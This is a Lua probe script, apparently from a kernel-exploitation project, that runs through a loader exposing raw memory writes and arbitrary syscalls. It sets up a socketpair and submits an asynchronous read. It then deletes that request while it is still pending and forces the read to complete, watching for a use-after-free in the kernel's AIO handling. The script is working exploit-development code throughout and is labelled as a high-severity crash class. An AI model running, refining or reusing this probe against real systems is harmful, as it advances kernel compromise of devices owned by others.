-- CRASH_CLASS: HIGH
-- PROBE 566f: delete an aio request that is still waiting on a socket
--
-- Context: 566b shows a file read completes during the first poll, so it cannot
-- be caught in flight. A socket read has to wait for data, which keeps the
-- object pending across calls. That is the window the 14.20 note describes:
-- delete the object while the kernel job still holds it, then let it complete.
--
-- All addresses are plain Lua numbers (memory.alloc's table form breaks mixed
-- arithmetic in this loader).

print("=== PROBE 566f: DELETE A PENDING AIO READ ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wd(addr, value) pcall(function() memory.write_dword(addr, value) end) end
local function wq(addr, value) pcall(function() memory.write_qword(addr, value) end) end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end

local reqs = to_num(memory.alloc(0x200))
local data = to_num(memory.alloc(0x1000))
local result = to_num(memory.alloc(0x200))
local ids = to_num(memory.alloc(0x200))
local states = to_num(memory.alloc(0x100))
local fds = to_num(memory.alloc(0x20))
local msg = to_num(memory.alloc(0x20))
for i = 0, 0x3FF do wd(data + i * 4, 0xA5A5A5A5) end
for i = 0, 0x1F do
    wd(result + i * 4, 0)
    wd(ids + i * 4, 0)
    wd(states + i * 4, 0)
    wd(fds + i * 4, 0)
    wd(msg + i * 4, 0)
end
for i = 0, 0x3F do wq(reqs + i * 8, uint64(0)) end
print(string.format("[0] reqs=%08X data=%08X result=%08X ids=%08X states=%08X fds=%08X", reqs, data, result, ids, states, fds))

-- [A] socketpair
print("[A] socketpair(135)")
local ok, rv = pcall(function() return sc(135)(U(1), U(1), U(0), U(fds), Z, Z) end)
print(string.format("  ret=%s fd0=%d fd1=%d", ok and tostring(sgn(rv)) or "PCALL-FAIL", rd(fds), rd(fds + 4)))
local fd0, fd1 = rd(fds), rd(fds + 4)
if fd0 < 3 or fd1 < 3 then
    print("[A] no two fds; abort")
    print("=== 566f ABORT ===")
    return
end

-- [B] submit the read
local function fill_req(off, len, buf, res, fd)
    wq(reqs + 0x00, U(off))
    wq(reqs + 0x08, U(len))
    wq(reqs + 0x10, U(buf))
    wq(reqs + 0x18, U(res))
    wd(reqs + 0x20, fd)
    wd(reqs + 0x24, 0)
end
print("[B] create read on fd0")
fill_req(0, 16, data, result, fd0)
print(string.format("  669 ret=%s id=0x%X", tostring(sgn(sc(669)(U(1), U(reqs), U(1), U(1), U(ids), Z))), rd(ids)))

-- [C] poll: expect pending
for k = 1, 2 do
    print(string.format("[C%d] poll ret=%s state=0x%X res=0x%X", k,
        tostring(sgn(sc(664)(U(ids), U(1), U(states), Z, Z, Z))), rd(states), rd(result)))
end

-- [D] delete while pending
print("[D] delete while pending")
print(string.format("  662 ret=%s status=0x%X", tostring(sgn(sc(662)(U(ids), U(1), U(states), Z, Z, Z))), rd(states)))
print(string.format("  data=%08X %08X", rd(data), rd(data + 4)))

-- [E] let the read complete
print("[E] write to fd1")
wd(msg, 0x41414141)
wd(msg + 4, 0x42424242)
print(string.format("  write ret=%s", tostring(sgn(sc(4)(U(fd1), U(msg), U(8), Z, Z, Z)))))

-- [F] observe
for k = 1, 3 do
    print(string.format("[F%d] data=%08X %08X res=0x%X pollstate=0x%X", k,
        rd(data), rd(data + 4), rd(result),
        (function() sc(664)(U(ids), U(1), U(states), Z, Z, Z) return rd(states) end)()))
end

-- [G] health
print("[G] health cycle")
wd(ids, 0) wd(states, 0) wd(result, 0)
for i = 0, 0x3FF do wd(data + i * 4, 0xA5A5A5A5) end
fill_req(0, 16, data, result, fd0)
print(string.format("  669 ret=%s id=0x%X", tostring(sgn(sc(669)(U(1), U(reqs), U(1), U(1), U(ids), Z))), rd(ids)))
print(string.format("  664 ret=%s state=0x%X", tostring(sgn(sc(664)(U(ids), U(1), U(states), Z, Z, Z))), rd(states)))
print(string.format("  662 ret=%s status=0x%X", tostring(sgn(sc(662)(U(ids), U(1), U(states), Z, Z, Z))), rd(states)))

print("=== 566f DONE ===")
